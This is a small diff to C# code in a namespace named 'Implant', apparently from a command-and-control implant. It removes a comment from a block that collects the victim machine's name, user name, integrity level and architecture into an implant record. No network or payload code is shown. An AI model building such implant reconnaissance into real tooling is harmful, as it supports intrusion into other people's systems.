@@ -23,7 +23,7 @@ namespace Implant
             var proc = Process.GetCurrentProcess();
 
             _implantData = new ImplantData {
-                // get DNS hostname
+             
                 ID = ImplantDataUtils.GenImplantName(), HostName = Environment.MachineName,
                 User = Environment.UserName, Integrity = ImplantDataUtils.ReturnIntegrity(),
                 Arch = ImplantDataUtils.ReturnArch(),
